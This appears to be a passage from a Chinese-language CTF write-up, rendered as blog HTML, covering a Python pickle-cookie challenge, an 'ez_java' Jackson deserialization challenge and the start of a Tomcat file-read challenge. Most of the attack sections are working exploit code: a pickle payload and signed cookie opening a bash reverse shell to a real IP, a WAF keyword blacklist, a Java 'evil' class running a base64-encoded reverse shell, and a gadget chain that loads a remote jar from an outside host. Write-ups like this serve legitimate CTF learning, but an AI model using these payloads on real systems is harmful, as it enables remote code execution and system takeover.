key</span>):</span><br><span class="line">    msg = base64.b64encode(pickle.dumps(data, -<span class="number">1</span>))</span><br><span class="line">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span><br><span class="line">    <span class="keyword">return</span> tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_decode</span>(<span class="params">data, key</span>):<span class="comment">#key=secret</span></span><br><span class="line">    data = tob(data)</span><br><span class="line">    <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">        sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">            <span class="keyword">return</span> pickle.loads(base64.b64decode(msg))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    blacklist = [<span class="string">b&#x27;R&#x27;</span>, <span class="string">b&#x27;secret&#x27;</span>, <span class="string">b&#x27;eval&#x27;</span>, <span class="string">b&#x27;file&#x27;</span>, <span class="string">b&#x27;compile&#x27;</span>, <span class="string">b&#x27;open&#x27;</span>, <span class="string">b&#x27;os.popen&#x27;</span>]</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> data:</span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">            <span class="comment"># print(word)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_check</span>(<span class="params">key, secret=<span class="literal">None</span></span>):</span><br><span class="line">    a = request.cookies.get(key)</span><br><span class="line">    data = tob(request.cookies.get(key))</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">            sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">                res = base64.b64decode(msg)</span><br><span class="line">                <span class="keyword">if</span> waf(res):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_check</span>(<span class="params">key, value, secret=<span class="literal">None</span></span>):</span><br><span class="line">    a = key</span><br><span class="line">    data = tob(value)</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">2</span>)</span><br><span class="line">            sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">                <span class="built_in">print</span>(<span class="number">3</span>)</span><br><span class="line">                res = base64.b64decode(msg)</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line">                <span class="keyword">if</span> waf(res):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.encode(enc) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, unicode) <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">key, default=<span class="literal">None</span>, secret=<span class="literal">None</span></span>):</span><br><span class="line">    value = request.cookies.get(key)</span><br><span class="line">    <span class="keyword">if</span> secret <span class="keyword">and</span> value:</span><br><span class="line">        dec = cookie_decode(value, secret)</span><br><span class="line">        <span class="keyword">return</span> dec[<span class="number">1</span>] <span class="keyword">if</span> dec <span class="keyword">and</span> dec[<span class="number">0</span>] == key <span class="keyword">else</span> default</span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">key, value, default=<span class="literal">None</span>, secret=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> secret <span class="keyword">and</span> value:</span><br><span class="line">        dec = cookie_decode(value, secret)</span><br><span class="line">        <span class="keyword">return</span> dec[<span class="number">1</span>] <span class="keyword">if</span> dec <span class="keyword">and</span> dec[<span class="number">0</span>] == key <span class="keyword">else</span> default</span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_is_encoded</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(data.startswith(tob(<span class="string">&#x27;!&#x27;</span>)) <span class="keyword">and</span> tob(<span class="string">&#x27;?&#x27;</span>) <span class="keyword">in</span> data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_lscmp</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> <span class="built_in">sum</span>(<span class="number">0</span> <span class="keyword">if</span> x == y <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)) <span class="keyword">and</span> <span class="built_in">len</span>(a) == <span class="built_in">len</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_cookie</span>(<span class="params">name, value, secret=<span class="literal">None</span>, **options</span>):</span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line">        value = touni(cookie_encode((name, value), secret))</span><br><span class="line"><span class="comment">#        resp = make_response(&quot;success&quot;)</span></span><br><span class="line"><span class="comment">#        resp.set_cookie(&quot;user&quot;, value, max_age=3600)</span></span><br><span class="line"><span class="comment">#        return resp</span></span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&#x27;Secret key missing for non-string Cookie.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(value) &gt; <span class="number">4096</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Cookie value to long.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touni</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span>, err=<span class="string">&#x27;strict&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.decode(enc, err) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>) <span class="keyword">else</span> unicode(s)</span><br><span class="line"></span><br><span class="line">res = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/106.52.94.23/2333 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(set_cookie(<span class="string">&quot;user&quot;</span>, res, secret=<span class="string">&quot;EnjoyThePlayTime123456&quot;</span>))</span><br><span class="line"><span class="comment">#!+I52x1zs1xPYp+dvH1prxw==?gAWVUwAAAAAAAACMBHVzZXKUQ0YoY29zCnN5c3RlbQpTJ2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTA2LjUyLjk0LjIzLzIzMzMgMD4mMSInCm8ulIaULg==</span></span><br><span class="line"><span class="comment">#print(cookie_decode(&quot;!wrOrGvOq04P1y+tIAmefFQ==?gAWVhAAAAAAAAACMBHVzZXKUQ3djYnVpbHRpbnMKZ2V0YXR0cgooY2J1aWx0aW5zCmRpY3QKUydnZXQnCnRSKGNidWlsdGlucwpnbG9iYWxzCih0UlMnX19idWlsdGluc19fJwp0UnAwCmNidWlsdGlucwpnZXRhdHRyCihnMApTJ2V2YWwnCnRSLpSGlC4=&quot;, &quot;EnjoyThePlayTime123456&quot;))</span></span><br><span class="line"><span class="comment">#data = get_cookie(&quot;user&quot;, value=&quot;!wrOrGvOq04P1y+tIAmefFQ==?gAWVhAAAAAAAAACMBHVzZXKUQ3djYnVpbHRpbnMKZ2V0YXR0cgooY2J1aWx0aW5zCmRpY3QKUydnZXQnCnRSKGNidWlsdGlucwpnbG9iYWxzCih0UlMnX19idWlsdGluc19fJwp0UnAwCmNidWlsdGlucwpnZXRhdHRyCihnMApTJ2V2YWwnCnRSLpSGlC4=&quot;, secret=&quot;EnjoyThePlayTime123456&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#if isinstance(data, bytes):</span></span><br><span class="line"><span class="comment">#        a = pickle.loads(data)</span></span><br><span class="line"><span class="comment">#        data = str(data, encoding=&quot;utf-8&quot;)</span></span><br><span class="line"><span class="comment">#        print(a)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># print(cookie_check(&quot;user&quot;, value=&quot;!+I52x1zs1xPYp+dvH1prxw==?gAWVUwAAAAAAAACMBHVzZXKUQ0YoY29zCnN5c3RlbQpTJ2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTA2LjUyLjk0LjIzLzIzMzMgMD4mMSInCm8ulIaULg==&quot;, secret=&quot;EnjoyThePlayTime123456&quot;))</span></span><br></pre></td></tr></table></figure>
+<p>直接往<code>/board</code>里打cookie即可，这样shell就能弹过来了：</p>
+<img src="/posts/undefined/7.png" class title="awa">
+<h1><span id="ez_java"> ez_java</span></h1>
+<p>最拖时间的题目，传统美德。</p>
+<p>拿到源码一眼顶针打jackson，但是能用的链子全部被ban，包括能够触发jackson的链子也都断了。</p>
+<p>给了一个<code>userBean</code>，盲猜有用，发现<code>userBean</code>里定义了一个去奇怪的函数<code>getGift</code>，是一个getter，能够用jackson触发。</p>
+<img src="/posts/undefined/8.png" class title="awa">
+<p>尝试用jrmp，但是不行。本来就没有办法，如果用jrmp随便就能打穿的话这题就没啥意义了。</p>
+<p>似乎没啥出路了，这里只能去搜一下<code>addurl</code>是干啥的，没想到让我找到了一篇新文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11837?time__1311=Cq0xuD07itdeqGNen%3DDRDAO73Dk0dFeW4D#toc-2">https://xz.aliyun.com/t/11837?time__1311=Cq0xuD07itdeqGNen%3DDRDAO73Dk0dFeW4D#toc-2</a></p>
+<p>真的很像了，卧槽，都是这个addURL来打的。通过addURL加载远程类从而进行rce。</p>
+<p>这边就有新思路了：</p>
+<p><code>Jackson -&gt; getter -&gt; getGift加载远程jar包</code></p>
+<p>但是怎么打jackson呢？</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/uuzeray/article/details/139222583">https://blog.csdn.net/uuzeray/article/details/139222583</a></p>
+<p>Z3r4y师傅的京麟ctf里看见了个新路线：</p>
+<img src="/posts/undefined/9.png" class title="awa">
+<p>抄它的代码：</p>
+<img src="/posts/undefined/10.png" class title="awa">
+<p>但是连不上vps，没打成功，哪出问题了呢？</p>
+<p>这里卡了我很长很长时间，绷不住了。jar包里readObject和static都分别试过了，就是没合在一起试，真tm的出生。</p>
+<p>jar包：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evil</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41Mi45NC4yMy8yMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41Mi45NC4yMy8yMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>idea</code>里编译成<code>.class</code>文件后再去用<code>jar</code>直接打包成<code>.jar</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf evil.jar evil.class</span><br></pre></td></tr></table></figure>
+<p>先按先知那篇文章的打法用<code>jackson</code>触发<code>getter</code>把<code>jar</code>包加载进<code>classpath</code>里：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Err0r233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.ycbjava.bean.User;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">node</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">wr</span> <span class="operator">=</span> node.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        node.removeMethod(wr);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        node.toClass(classLoader, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;url:http://106.52.94.23:6001/evil.jar&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(user);</span><br><span class="line"></span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">eventListenerList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getValue(manager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">        vector.add(pojoNode);</span><br><span class="line">        setValue(eventListenerList, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);</span><br><span class="line"></span><br><span class="line">        base64encode_exp(eventListenerList);</span><br><span class="line">        Deserialize(<span class="string">&quot;rO0ABXNyACNqYXZheC5zd2luZy5ldmVudC5FdmVudExpc3RlbmVyTGlzdLE2xn2E6tZEAwAAeHB0ABdqYXZhLmxhbmcuSW50ZXJuYWxFcnJvcnNyABxqYXZheC5zd2luZy51bmRvLlVuZG9NYW5hZ2Vy4ysheUxxykICAAJJAA5pbmRleE9mTmV4dEFkZEkABWxpbWl0eHIAHWphdmF4LnN3aW5nLnVuZG8uQ29tcG91bmRFZGl0pZ5QulPblf0CAAJaAAppblByb2dyZXNzTAAFZWRpdHN0ABJMamF2YS91dGlsL1ZlY3Rvcjt4cgAlamF2YXguc3dpbmcudW5kby5BYnN0cmFjdFVuZG9hYmxlRWRpdAgNG47tAgsQAgACWgAFYWxpdmVaAAtoYXNCZWVuRG9uZXhwAQEBc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAGRzcgAsY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuUE9KT05vZGUAAAAAAAAAAgIAAUwABl92YWx1ZXQAEkxqYXZhL2xhbmcvT2JqZWN0O3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAHWNvbS5leGFtcGxlLnljYmphdmEuYmVhbi5Vc2Vyz86z8HK2h4oCAANMAARnaWZ0dAASTGphdmEvbGFuZy9TdHJpbmc7TAAIcGFzc3dvcmRxAH4AE0wACHVzZXJuYW1lcQB+ABN4cHB0AAMxMjN0ACV1cmw6aHR0cDovLzEyNy4wLjAuMTo4MDAwL2V2aWwzLmNsYXNzcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBweAAAAAAAAABkcHg=&quot;</span>);</span><br><span class="line">        Class.forName(<span class="string">&quot;org.mariadb.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:mariadb://localhost:3306/ez_java?serverTimezone=GMT%2B8&quot;</span>, <span class="string">&quot;javauser&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span>&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">if</span>(clazz.getSuperclass() != <span class="literal">null</span>)&#123;</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), name);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">base64encode_exp</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Deserialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(s));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这样，然后往<code>/ser</code>里打这个<code>payload</code>。这样能把<code>evil.jar</code>加载进去。然后再直接反序列化触发<code>evil</code>里的<code>readObject</code>就可以了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">evil</span> <span class="variable">ev1l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">evil</span>();</span><br><span class="line">        base64_exp(ev1l);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">base64_exp</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第二次发上面这个的exp，shell就能弹过来了：</p>
+<img src="/posts/undefined/11.png" class title="awa">
+<h1><span id="tomtom2"> tomtom2</span></h1>
+<p>这个题目给了一个<code>/read</code>路由，从<code>/read</code>路由里能够读取到<code>xml</code>，从他给的<code>/env</code>路由里可以得到当前tomcat的存放路径存放在<code>/opt/tomcat</code>，问题是只限定读取<code>.xml</code>后缀文件。</p>
+<p>说到读取xml，第一时间想到了读取<code>web.xml</code>，但是提示非法的文件名。说明我们不能够读取web.xml。所以只能换个思路读取</p>
+<blockquote>
+<p>在tomcat下，它的配置文件共有4个：</p>
+<ul>
+<li>context.xml</li>
+<li>web.xml</li>
+<li>server.xml</li>
+<li>tomcat-users.xml</li>
+</ul>
+</blockquote>
+<p>留个伏笔，先讲一下这四个xml是来干嘛的：</p>
+<h2><span id="webxml"> web.xml</span></h2>
+<p>web.xml是应用程序描述文件。在java工程中，<code>web.xml</code>用来初始化工程配置信息，例如欢迎页，错误页等。在我看来基本上就是用于配置web路由的，一个最普通的样例<code>web.xml</code>如下：</p>
